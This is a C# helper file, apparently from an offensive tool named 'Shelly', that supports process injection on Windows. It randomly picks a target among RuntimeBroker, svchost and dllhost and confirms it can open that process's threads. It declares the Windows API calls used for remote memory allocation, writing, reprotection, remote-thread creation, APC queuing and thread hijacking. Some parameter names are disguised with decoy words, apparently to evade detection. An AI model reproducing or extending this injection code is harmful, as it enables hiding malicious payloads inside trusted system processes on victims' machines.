using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace Shelly
{
    public class HelperMethods
    {
        public static Process SelectTargetProcess()
        {
            List<String> preferred_list = new List<String> { "RuntimeBroker", "svchost", "dllhost" };
            String preferred = preferred_list[new Random().Next(0, preferred_list.Count)];
            List<Process> candidates = new List<Process>();
            int myPid = Process.GetCurrentProcess().Id;
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    // cannot inject from a 32-bit to 64-bit proc.
                    if (IntPtr.Size == 4 && Is64Bit(p.Handle))
                        continue;
                    else if (p.Id != myPid && p.ProcessName.ToLower().StartsWith(preferred.ToLower()))
                    {
                        // Trying to open a thread will throw an exception if I dont own it.
                        IntPtr temp = OpenThread(ThreadAccess.SET_CONTEXT, false, p.Threads[0].Id);
                        if (temp == IntPtr.Zero)
                            continue;
                        CloseHandle(temp);
                        candidates.Add(p);
                    }
                }
                catch { continue; }
            }
            return candidates[new Random().Next(candidates.Count)];
        }

        public static int GetMostRecentThread(Process p)
        {
            DateTime earliest = DateTime.MinValue;
            int threadId = 0;
            foreach (ProcessThread thread in p.Threads)
            {
                if (thread.StartTime >= earliest)
                {
                    earliest = thread.StartTime;
                    threadId = thread.Id;
                }
            }
            return threadId;
        }

        private static Boolean Is64Bit(IntPtr handle)
        {
            IsWow64Process(handle, out bool is64);
            return !is64;
        }

        #region DLLIMPORTS
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(String p1, String p2, IntPtr p3, IntPtr p4, bool p5, Int32 p6, IntPtr p7, String p8, ref STARTUPINFOEX p9, out PROCESS_INFORMATION p10);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(IntPtr p1, IntPtr p2, uint p3, IntPtr p4, IntPtr p5, uint p6, out IntPtr p7);

        [DllImport("kernel32.dll")]
        public static extern IntPtr HeapCreate(UInt32 p1, Int32 p2, Int32 p3);

        [DllImport("kernel32.dll")]
        public static extern IntPtr HeapAlloc(IntPtr p1, UInt32 p2, Int32 p3);

        [DllImport("kernel32.dll")]
        public static extern bool HeapFree(IntPtr p1, UInt32 p2, IntPtr p3);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool IsWow64Process(IntPtr p1, out bool p2);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenThread(ThreadAccess p1, bool p2, int p3);

        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr p1, IntPtr p2, IntPtr p3);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr p1);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int SuspendThread(IntPtr p1);

        [DllImport("kernel32.dll")]
        public static extern IntPtr WriteProcessMemory(IntPtr p1, IntPtr p2, Byte[] p3, Int32 p4, out IntPtr p5);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr WriteProcessMemory(IntPtr p1, IntPtr p2, Byte[] p3, Int32 p4, out int p5);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr p1, IntPtr p2, Int32 p3, Int32 p4, Int32 p5);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr p1, IntPtr p2, UInt32 p3, UInt32 p4, UInt32 p5);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFreeEx(IntPtr p1, IntPtr p2, int p3, uint p4);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualProtectEx(IntPtr broadband, IntPtr bend, Int32 jackie, UInt32 yen, out UInt32 roster);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibraryA(string fileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibraryExA(
            string lpFileName,
            IntPtr hReservedNull,
            uint dwFlags);

        [DllImport("kernel32", SetLastError = true)]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr WaitForSingleObject(IntPtr p1, UInt32 p2);

        #endregion

        #region DataStructures
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | QUERY_INFORMATION,
            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }
        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        #endregion

    }
}
